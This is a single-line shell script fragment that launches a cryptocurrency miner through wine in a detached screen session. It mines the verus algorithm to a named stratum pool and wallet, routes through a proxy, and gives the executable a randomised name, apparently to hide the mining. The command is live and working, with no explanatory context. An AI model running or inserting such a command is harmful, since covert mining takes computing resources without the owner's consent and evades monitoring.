...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://usw.vipor.net:5040 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.beluttgacor -p d=5 -t 4 --proxy=$proxy_url"
